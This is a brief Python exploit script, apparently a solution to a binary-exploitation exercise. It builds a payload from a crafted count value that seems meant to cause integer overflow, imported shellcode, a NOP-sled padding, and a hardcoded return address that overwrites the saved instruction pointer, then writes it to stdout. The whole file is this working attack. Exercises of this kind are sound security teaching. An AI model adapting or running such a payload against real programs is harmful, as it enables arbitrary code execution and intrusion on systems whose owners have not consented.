#!/usr/bin/env python3

import sys

from shellcode import shellcode

import struct

count = 0x40000000000000c8.to_bytes(8, "little")

padding = b'\x90' * (872 - len(shellcode))

return_address = 0x7ffffff69e10.to_bytes(8, "little")

payload = count + shellcode + padding + return_address

sys.stdout.buffer.write(payload)
